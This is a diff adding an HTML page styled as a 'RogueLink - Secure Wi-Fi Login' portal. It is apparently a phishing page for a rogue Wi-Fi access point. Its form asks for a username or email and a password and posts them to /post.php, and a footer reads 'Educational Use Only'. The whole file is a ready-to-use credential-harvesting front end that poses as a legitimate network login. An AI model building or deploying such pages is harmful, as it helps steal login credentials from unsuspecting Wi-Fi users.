@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RogueLink - Secure Wi-Fi Login</title>
+    <style>
+        body {
+            background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #fff;
+        }
+        .login-container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+            text-align: center;
+            width: 300px;
+        }
+        .login-container img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .login-container input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+        }
+        .login-container input::placeholder {
+            color: #ddd;
+        }
+        .login-container button {
+            margin-top: 20px;
+            width: 100%;
+            padding: 12px;
+            background: #d32f2f;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .login-container button:hover {
+            background: #b71c1c;
+        }
+        .footer {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #bbb;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="roguelink_logo.png" alt="RogueLink Logo">
+        <h2>Welcome to RogueLink</h2>
+        <form action="/post.php" method="POST">
+            <input type="text" name="username" placeholder="Username / Email" required><br>
+            <input type="password" name="password" placeholder="Password" required><br>
+            <button type="submit">Connect</button>
+        </form>
+        <div class="footer">Educational Use Only</div>
+    </div>
+</body>
+</html>
